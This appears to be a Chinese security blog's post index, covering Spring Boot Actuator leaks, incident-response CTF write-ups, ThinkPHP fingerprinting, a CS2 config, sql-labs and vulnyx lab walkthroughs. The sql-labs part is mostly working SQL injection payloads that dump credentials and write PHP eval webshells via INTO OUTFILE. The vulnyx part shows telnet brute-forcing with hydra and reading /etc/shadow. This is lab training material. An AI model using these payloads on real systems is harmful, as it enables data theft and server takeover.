/actuator/shutdown shutdown端点用于关闭应用程序。 0x03 漏洞利用 前面介绍过了Actuator一些基础后，现在来研究一下如果目标站点存在这个漏洞该如何利用。\n首先访问一下/actuator/env该文件目录，寻找一下敏感信息等等\n/actuator/heapdump文件可以直接下载下来。使用工具进行分析：\n工具下载地址：\n1 2 3 通过网盘分享的文件：JDumpSpider-1.1-SNAPSHOT-full.jar 链接: https://pan.baidu.com/s/1tL0gY9Xm4jBrXUxVj-g8og 提取码: pkb9 --来自百度网盘超级会员v4的分享 使用：\n1 java -jar JDumpSpider-1.1-SNAPSHOT-full.jar 绝地地址（heapdump） \u0026gt;\u0026gt;222.txt 这里直接泄露了Cookie信息。\n0x04 漏洞修复 1、屏蔽actuator路径\n1 2 3 location ~ .*actuator.* { deny all; } ","date":"2025-09-02T00:00:00Z","image":"http://localhost:57441/images/27.webp","permalink":"http://localhost:57441/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95spring-boot-actuator-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E9%AB%98%E5%8D%B1/","title":"【渗透测试】Spring Boot Actuator 敏感信息泄露-高危"},{"content":"简介 服务器场景操作系统 Windows\n服务器账号密码 administrator xj@123456\n题目来源公众号 知攻善防实验室\nhttps://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA\n任务环境说明\n注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！\n应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查\n开放题目\n漏洞修复\n参考\nhttps://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg\n靶机启动 过程 flag1 通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;\n上传D盾,直接扫就行.\n打开文件,发现默认密码\nflag\n1 flag{rebeyond} flag2 通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;\n查看apache.log文件,发现写入了webshell.php文件.\n1 log日志地址:C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs flag:\n1 flag{192.168.126.1} flag3 通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;\n直接使用工具,即可\nflag:\n1 flag{hacker138} flag4 通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;\n找到hacker128用户的桌面,发现一个恶意的挖矿程序,然后进行反编译一下,得到flag\nflag\n1 flag{wakuang.zhigongshanfang.top} ","date":"2025-09-01T00:00:00Z","image":"http://localhost:57441/images/25.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-emlog/","title":"【玄机靶场】第四章 windows 实战-emlog"},{"content":"简介 第四章 windows实战-wordpress\nrdp 端口 3389\n账号：administrator\n密码：xj@123456\nflag1 请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}\n登录后台，获取后台地址：http://localhost:8080/manage/login.php\n在日志里筛选一下：\n1 grep \u0026#34;manage/login.php\u0026#34; access.log 可以看到302成功跳转：\n1 2 3 4 5 6 7 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1\u0026#34; 302 5 \u0026#34;http:// 192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) G ecko/20100101 Firefox/110.0\u0026#34; 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;GET /manage/ HTTP/1.1\u0026#34; 302 5 \u0026#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F %2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\u0026#34; 192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] \u0026#34;GET /manage/welcome.php HTTP/1.1\u0026#34; 200 10013 \u0026#34;http://192.168.141.188/manage/login.php?ref erer=http%3A%2F%2F192.168.141.188%2Fmanage%2F\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\u0026#34; flag\n1 flag{2023:04:29 22:45:23} flag2 请提交攻击者的浏览器版本 flag{Firgfox/2200}\n由flag1可知\nflag\n1 flag{Firefox/110.0} flag3 请提交攻击者目录扫描所使用的工具名称\n可以看出扫描器的特征：\n1 Fuzz Faster U Fool v1.5.0 flag\n1 flag{Fuzz Faster U Fool} flag4 找到攻击者写入的恶意后门文件，提交文件名（完整路径）\n查看日志：\n1 flag{C:\\phpstudy_pro\\WWW\\.x.php} flag5 找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）\nD盾直接扫描即可：\n1 flag{C:\\phpstudy_pro\\WWW\\usr\\themes\\default\\post.php} flag6 请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}\n查看开机自动文件夹，并没有发现有什么恶意的东西。\n1 2 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 并无可疑文件，接下来查看 Temp 目录和 Windows 目录\n在 Windows 目录下，发现可疑文件\n在windows目录下，发现一个x.bat文件，发现这个bat文件是打开360.exe文件\nflag\n1 flag{x.bat} ","date":"2025-09-01T00:00:00Z","image":"http://localhost:57441/images/26.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-wordpress/","title":"【玄机靶场】第四章 windows 实战-wordpress"},{"content":"1. 前言 服务框架是指某领域一类服务的可复用设计与不完整的实现， 与软件框架不同的是， 服务框架同时体现着面向服务， 一个服务框架可以分为两个主要部分： 服务引擎、 引入的外部服务。 ThinkPHP， 是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。 可想而知框架连接着网络和系统接触着越来越多的关键数据， 渐渐成为单位公共安全中最具有战略性的资产， 框架的安全稳定运行也直接决定着业务系统能否正常使用。 如果框架被远程代码执行攻破， 这些信息一旦被篡改或者泄露， 轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。\nThinkPHP是一个快速、 兼容而且简单的轻量级国产PHP开发框架， 诞生于2006年初， 原名FCS， 2007年元旦正式更名为ThinkPHP， 遵循Apache2开源协议发布， 从Struts结构移植过来并做了改进和完善， 同时也借鉴了国外很多优秀的框架和模式， 使用面向对象的开发结构和MVC模式， 融合了Struts的思想和TagLib（ 标签库） 、 RoR的ORM映射和ActiveRecord模式。 ThinkPHP可在Windows和Linux等操作系统运行， 支持MySql， Sqlite\n和PostgreSQL等多种数据库以及PDO扩展， 是一款跨平台， 跨版本以及简单易用的PHP框架。\n2. 识别tp框架（指纹） 2.1 icon判断 /favicon.ico\n2.1 报错 2.3 错误传参 2.4 特殊指纹出现logo /?c=4e5e5d7364f443e28fbf0d3ae744a59a\n/4e5e5d7364f443e28fbf0d3ae744a59a\n/4e5e5d7364f443e28fbf0d3ae744a59a-index.html\n2.5 body特征 body里有\u0026quot;十年磨一剑\u0026quot; 或者\u0026quot;ThinkPHP\u0026quot;\n2.6 插件 ","date":"2025-08-31T00:00:00Z","image":"http://localhost:57441/images/22.webp","permalink":"http://localhost:57441/p/thinkphp%E8%AF%86%E5%88%ABtp%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9-01/","title":"【Thinkphp】识别tp框架(指纹)-01"},{"content":"简介 题目来源公众号 vulntarget\nhttps://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg\n任务环境说明\nwindows账密：workstation admin@20221123\nweb端口外部无法访问，请RDP连接上机排查\nflag1 主站进入后台的文件名称？\n查看apache日志，找到\nflag\n1 flag{FNeSOgYGkp.php} flag2 黑客是从哪个端口上传木马文件的?\n打开小皮查看网页端口，7001打不开，所以为80\nflag\n1 flag{80} flag3 黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)\n直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。\n1 flag{api3.php:Admin} flag4 可以根据日志查看：\n1 flag{192.168.112.123} ","date":"2025-08-31T00:00:00Z","image":"http://localhost:57441/images/24.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-j-01/","title":"【玄机靶场】应急响应-vulntarget-j-01"},{"content":"autoexec.cfg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 alias +pwaswitchknife slot3 alias -pwaswitchknife lastinv alias \u0026#34;refundall\u0026#34; \u0026#34;sellback 0;sellback 1;sellback 2;sellback 3;sellback 4;sellback 5;sellback 6;sellback 8;sellback 9;sellback 10;sellback 11;sellback 12;sellback 13;sellback 14;sellback 15;sellback 16;sellback 17;sellback 18;sellback 26;sellback 26;sellback 27;sellback 28;sellback 29;sellback 30;sellback 32;sellback 33;sellback 34;sellback 35;play ui\\panorama\\itemtile_click_02.vsnd_c\u0026#34; //-----------------------------HUD设置-------------------------------- //游戏HUD(0关闭,1开启) cl_drawhud \u0026#34;1\u0026#34;; //只显示击杀和准星(0关闭,1开启) cl_draw_only_deathnotices \u0026#34;0\u0026#34;; //HUD颜色(0队伍颜色,1白色,2亮白色,3淡蓝色,4蓝色,5紫色,6红色,7橙色,8黄色,9绿色,10浅绿色,11粉红色) cl_hud_color \u0026#34;11\u0026#34;; //一直显示装备栏(0关闭,1开启) cl_showloadout \u0026#34;1\u0026#34;; //游戏自动提示(0关闭,1开启) cl_autohelp \u0026#34;0\u0026#34;; //鼠标灵敏度 sensitivity 1.2 zoom_sensitivity_ratio_mouse 1.2 //-----------------------------准星设置-------------------------------- cl_crosshairalpha \u0026#34;200\u0026#34;; cl_crosshaircolor \u0026#34;1\u0026#34;;//颜色 cl_crosshairdot \u0026#34;0\u0026#34;; cl_crosshair_t \u0026#34;0\u0026#34;; cl_crosshairgap \u0026#34;-5\u0026#34;;//间距 cl_crosshairsize \u0026#34;1.29\u0026#34;;//长度 cl_crosshairstyle \u0026#34;4\u0026#34;; cl_crosshairthickness \u0026#34;-10.0\u0026#34;;//粗细 cl_crosshair_outlinethickness \u0026#34;0\u0026#34;; cl_crosshair_drawoutline \u0026#34;0\u0026#34;; //狙击准星粗细 cl_crosshair_sniper_width \u0026#34;0\u0026#34;; //狙击准星模糊(0关闭，1开启) cl_crosshair_sniper_show_normal_inaccuracy \u0026#34;0\u0026#34;; //准星警告(0关闭，1开启) cl_crosshair_friendly_warning \u0026#34;0\u0026#34;; //手臂视角类型(0自定义，1默认，2写实，3经典) viewmodel_presetpos \u0026#34;3\u0026#34;; //手臂左右位置(-2.25~2.25) viewmodel_offset_x \u0026#34;2.5\u0026#34;; //手臂前后位置(-2~2) viewmodel_offset_y \u0026#34;0\u0026#34;; //手臂上下位置(-2~2) viewmodel_offset_z \u0026#34;-1.5\u0026#34;; //手臂FOV(54~68) viewmodel_fov \u0026#34;68\u0026#34;; //新手臂摇晃动作(false关闭，true开启) cl_usenewbob false //-----------------------------鼠标按键设置-------------------------------- //鼠标左键 开火 bind \u0026#34;mouse1\u0026#34; \u0026#34;+attack\u0026#34;; //鼠标右键 第二开火 bind \u0026#34;mouse2\u0026#34; \u0026#34;+attack2\u0026#34;; //鼠标里侧键 使用麦克风 bind \u0026#34;mouse5\u0026#34; \u0026#34;+voicerecord\u0026#34;; //鼠标外侧键 切换左右持枪 bind \u0026#34;mouse4\u0026#34; \u0026#34;switchhands\u0026#34;; //鼠标下滚轮 跳跃 bind \u0026#34;mwheeldown\u0026#34; \u0026#34;+jump\u0026#34;; //-----------------------------雷达设置-------------------------------- //游戏雷达(0关闭,1开启) cl_drawhud_force_radar \u0026#34;1\u0026#34;; //雷达大小(0.8~1.3) cl_hud_radar_scale \u0026#34;1.3\u0026#34;; //雷达缩放(0.25~0.7) cl_radar_scale \u0026#34;0.35\u0026#34;; //雷达以玩家为中心(0关闭,1开启) cl_radar_always_centered \u0026#34;0\u0026#34;; //雷达旋转(0关闭,1开启) cl_radar_rotate \u0026#34;1\u0026#34;; //雷达人物大小(0.4~1) cl_radar_icon_scale_min \u0026#34;0.4\u0026#34;; //计分板雷达显示模式(0圆形,1方形) cl_radar_square_with_scoreboard \u0026#34;1\u0026#34;; //-----------------------------游戏帧数上限(0无上限)-------------------------------- fps_max \u0026#34;0\u0026#34;; //-----------------------------按键绑定-------------------------------- bind \u0026#34;downarrow\u0026#34; \u0026#34;buy rifle1;\u0026#34; bind \u0026#34;rightarrow\u0026#34; \u0026#34;buy rifle4;\u0026#34; bind \u0026#34;leftarrow\u0026#34; \u0026#34;buy vesthelm;buy vest;\u0026#34; bind \u0026#34;kp_3\u0026#34; \u0026#34;buy secondary4;\u0026#34; bind \u0026#34;kp_4\u0026#34; \u0026#34;buy smokegrenade;\u0026#34; bind \u0026#34;kp_5\u0026#34; \u0026#34;buy flashbang;\u0026#34; bind \u0026#34;kp_6\u0026#34; \u0026#34;buy molotov;buy incgrenade;\u0026#34; //-----------------------------滚轮跳设置-------------------------------- //下滚轮跳 bind \u0026#34;MWHEELDOWN\u0026#34; \u0026#34;+jump\u0026#34; bind \u0026#34;v\u0026#34; \u0026#34;+jump\u0026#34; bind \u0026#34;space\u0026#34; \u0026#34;+jump\u0026#34; lianxi.cfg 一些跑图的cfg文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 //开启作弊 sv_cheats true //去除开场动画 cl_versus_intro false mp_team_intro_time 0 //钱 无限时间 购买时间地点 mp_buy_anywhere 1 mp_buytime 99999 ammo_grenade_limit_total 5 mp_maxmoney 16000 mp_startmoney 16000 mp_roundtime 60 mp_roundtime_defuse 60 mp_roundtime_hostage 60 mp_freezetime 0 bot_stop 1 //无坠落道具伤害 能看到火烧效果 sv_falldamage_scale 0 sv_hegrenade_damage_multiplier 0 sv_regeneration_force_on true ff_damage_reduction_grenade_self 0 //飞行 bind alt noclip //加bot和踢bot bind = bot_add bind - bot_kick //放置bot bind o bot_place //重复上一个道具 bind i sv_rethrow_last_grenade //刷新游戏 bind l mp_restartgame 1 //切换子弹落点显示 bind p \u0026#34;toggle sv_showimpacts 0 1\u0026#34; //清除烟雾弹 bind k \u0026#34;ent_fire smokegrenade_projectile kill;ent_fire molotov_projectile kill;ent_fire flashbang_projectile kill;ent_fire hegrenade_projectile kill;ent_fire decoy_projectile kill;stopsound\u0026#34; //自动复活 mp_respawn_on_death_ct true mp_respawn_on_death_t true mp_restartgame 1 ","date":"2025-08-31T00:00:00Z","image":"http://localhost:57441/images/21.webp","permalink":"http://localhost:57441/p/%E6%B8%B8%E6%88%8Fcs2_cfg%E6%96%87%E4%BB%B6-%E4%B8%AA%E4%BA%BA%E4%BD%BF%E7%94%A8%E6%96%B9%E6%A1%88/","title":"【游戏】CS2_cfg文件-个人使用方案"},{"content":"Less-6 验证注入点：双引号报错，两个双引号闭合利用闭合方式：\u0026quot; \u0026lt;payload\u0026gt; --+\n就闭合方式和 Less-5 不一样外，其余都一样\n1.进入第六题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n发现闭合方式为\u0026quot;，和上一关同理采用报错注入，这里用extractvalue函数\n1 http://localhost/sqli-labs/Less-6/?id=1\u0026#34; 1 ?id=1\u0026#34; and extractvalue(1,concat(0x7e,(select concat(username,\u0026#39;:\u0026#39;,password) from users limit 0,1)))--+ Less-7 验证注入点：单引号报错，两个单引号闭合利用闭合方式：')) \u0026lt;payload\u0026gt; --+\n1 http://localhost/sqli-labs/Less-7/?id=1 前置知识:\n文件读写注入条件：\n在配置文件中设置\nsecure_file_priv=\u0026rsquo;\u0026rsquo;\n1 2 3 注： 1. Windows的配置文件在mysql下的my.ini 2. Linux的配置文件在/etc/conf 查看是否配置成功：\n1 show global variables like \u0026#39;%secure%\u0026#39;; php的配置文件php.ini关闭魔术引号\nmagic_quotes_gpc = Off 知道服务器的绝对路径 登录的账户具有root权限\n读取文件：\nload_file() 1 例：select load_file(\u0026#34;D:/password.txt\u0026#34;) # 读取D盘下的password.txt文件 写文件：\ninto outfile 路径\n实战\n1.判断闭合方式闭合方式\n利用报错信息判断闭合方式为\u0026rsquo;))\n1 http://localhost/sqli-labs/Less-7/?id=1 \u0026#39;)) --+ 利用文件读写注入写入木马：\n写入一句话木马：\n1 2 3 4 正常Payload:\u0026lt;?php eval($_POST[\u0026#39;pwd\u0026#39;]);?\u0026gt; 十六进制：0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e http://localhost/sqli-labs/Less-7/?id=-1\u0026#39;)) UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile \u0026#39;C:\\\\phpstudy_pro\\\\WWW\\\\hack.php\u0026#39; --+ 连接地址：http://localhost/hack.php\n连接密码：pwd\nLess-8 \u0026lsquo;闭合 布尔盲注\n使用的注入语句和第五关的布尔盲注一样\n示例，判断长度：\n1 http://localhost/sqli-labs/Less-8/?id=1\u0026#39;and length((select database()))\u0026gt;7 --+ 写shell：\n1 http://localhost/sqli-labs/Less-8/?id=-1\u0026#39; UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile \u0026#39;C:\\\\phpstudy_pro\\\\WWW\\\\hack.php\u0026#39; --+ 链接成功。\nLess-9 基于GET单引号基于时间盲注\n如果当前数据库名字符长度大于1，则执行sleep函数使数据库执行延迟，否则则返回1。\n1 2 http://localhost/sqli-labs/Less-9/?id=1\u0026#39; and if(length(database())\u0026gt;1,sleep(5),1) --+ 延迟5秒 Less-10 基于GET双引号基于时间盲注\n与第9关差不多，只不过闭合方式变成双引号了\n1 2 http://localhost/sqli-labs/Less-10/?id=1\u0026#34; and if(length(database())\u0026gt;1,sleep(5),1) --+ 延迟5秒 Less-11 基于单引号的POST注入\n单引号测试：\n1 uname=admin\u0026#39; and 1=1 --+ \u0026amp;passwd=\u0026amp;submit=Submit 字段个数：\n1 2 3 uname=admin\u0026#39; order by 3 %23 \u0026amp;passwd=\u0026amp;submit=Submit //报错 uname=admin\u0026#39; order by 2 %23 \u0026amp;passwd=\u0026amp;submit=Submit //正常 说明有两个字段 查找回显位：\n1 uname=-admin\u0026#39; union select 1,2 %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆库名：\n1 uname=-admin\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆表名：\n1 uname=-admin\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆列名：\n1 uname=-admin\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;emails\u0026#39; %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆信息：\n1 uname=-admin\u0026#39; union select 1,group_concat(concat_ws(\u0026#39;-\u0026#39;,id,email_id)) from emails %23 \u0026amp;passwd=\u0026amp;submit=Submit 写shell：\n1 uname=-admin\u0026#39; UNION SELECT 1,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;v\u0026#34;]);?\u0026gt;\u0026#39; into outfile \u0026#34;D:\\\\phpStudy_pro\\\\WWW\\\\hack1.php\u0026#34; %23 \u0026amp;passwd=\u0026amp;submit=Submit 成功连接\nLess-12 跟11关差不多，但是使用的是双引号加括号进行闭合。\n1 uname=admin\u0026#34;) order by 2 --+\u0026amp;passwd=\u0026amp;submit=Submit 然后后面跟11关一样。\nLess-13 基于单引号加括号进行闭合，错误回显注入。和十二关一样。\n构建payload:\n1 uname=admin\u0026#39;\u0026amp;passwd=pass\u0026amp;submit=Submit 1 从返回结果（sql语法问题）可见本关的闭合是\u0026#39;) 使用\n1 2 3 uname=admin\u0026#39;) order by 2 --+\u0026amp;passwd=pass\u0026amp;submit=Submit uname=admin\u0026#39;) order by 3 --+\u0026amp;passwd=pass\u0026amp;submit=Submit 进行测试，发现可知查询结果有两列 使用union进行查询，发现没有回显。\n1 uname=admin\u0026#39;) union select 1,2 --+\u0026amp;passwd=pass\u0026amp;submit=Submit 看来这关要用报错注入了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #获取服务器上所有数据库的名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库的所有表名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的所有列名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;pikachu\u0026#39; and table_name=\u0026#39;users\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的username和password列的所有值 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),94,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit 写webshell的payload:\n1 uname=ele\u0026#39;) or 1=1 limit 0,1 into outfile \u0026#39;C:/less13.php\u0026#39; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c65737331335d293b3f3e#\u0026amp;passwd=pass\u0026amp;submit=Submit Less-14 这关回显sql语法错误，并且闭合是\u0026quot;\n测试\n1 uname=admin\u0026#34;\u0026amp;passwd=pass\u0026amp;submit=Submit 和上一关一样，这关如果sql查询有值也不显示，所以还是用报错注入，图就不截了，和上一关差不多，跨库爆数据的所有payload如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #获取服务器上所有数据库的名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库的所有表名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的所有列名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;pikachu\u0026#39; and table_name=\u0026#39;users\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的username和password列的所有值 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),94,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit 写webshell的payload：\n1 uname=ele\u0026#34; or 1=1 limit 0,1 into outfile \u0026#39;C:/less14.php\u0026#39; lines terminated by 0x3C3F7068702061737365727428245F504F53545B6C65737331345D293B3F3E#\u0026amp;passwd=pass\u0026amp;submit=Submit 本关代码与上一关的区别也仅在于闭合不同了。\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:57441/images/22.webp","permalink":"http://localhost:57441/p/%E9%9D%B6%E5%9C%BAsql-labs-less-6-14/","title":"【靶场】sql-labs-Less 6-14"},{"content":"简介 vulnyx是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。\n部署方法 官网：https://vulnyx.com/\n1.在官网搜索你想要的镜像,然后下载\n2.下载好后解压得到.ova的文件，右击选择VMware进行打开\n3.在弹出的框中，选择存放的位置，然后点击导入\n4.最后等待导入完成，然后启动该虚拟机就可以了\n部署成功\n步骤 信息收集 这里我就不收集了，IP地址获取到了，如果在实战情况下还是需要确认一下的，直接fscan扫一边看一下：\n1 2 ./fscan.exe 192.168.198.137 -nobr -np nmap 192.168.30.45 -A -O -p 1-65535 这边使用fscan和nmap都扫描了一边发现开放了三个端口：\n1 2 3 22/tcp open ssh 23/tcp open telnet 80/tcp open http 这里进行尝试连接一下ssh，发现给出了一个账户：b.taylor\n22端口是不能爆破的。登录了一下发现是拒绝的。那就只能爆破23端口了。\n使用hydra进行爆破\n1 2 3 字典下载地址：https://github.com/dw0rsec/rockyou.txt hydra -l b.taylor -P /root/Desktop/Tools/rockyou.txt telnet://192.168.198.137 -V -I 账号密码：b.taylor/rockyou\n使用telnet进行登录即可：\nuser 1 ZWRjOWY1YzU1YWY4NzUwNTAzM2EyMGRkNDE5MzEzNjQK shadow提权 发现这个用户附加了shadow组\n可以查看一下权限\n1 2 id cat /etc/shadow 1 2 b.taylor:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7::: root:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20134:0:99999:7::: 然后直接修改密码即可。\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:57441/images/23.webp","permalink":"http://localhost:57441/p/%E9%9D%B6%E5%9C%BAvulnyx%E9%9D%B6%E5%9C%BA-lower2/","title":"【靶场】vulnyx靶场-Lower2"},{"content":"前言： Acunetix Premium 是一种 Web 应用程序安全解决方案，用于管理多个网站、Web 应用程序和 API 的安全。集成功能允许您自动化 DevOps 和问题管理基础架构。\n更新内容： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 改进 添加正则表达式以增强对 Django 应用程序中堆栈跟踪泄露的检测 改进了对使用弱密钥签名的 JWT 的检测 为暴露的 nginx.conf 和 .htaccess 文件添加了新的安全检查，以增强漏洞检测 添加了 LDAP 注入检测 增加了对 PII（个人身份信息）泄露漏洞的检测 JSON 响应中数据库连接字符串的新检测，以提高敏感数据暴露覆盖率 扫描仪已更新，支持从 Linux 使用 NTLM 身份验证扫描目标 更新了秘密令牌检测以增加覆盖范围 更新了 JSON 字段中的 DB 连接检测 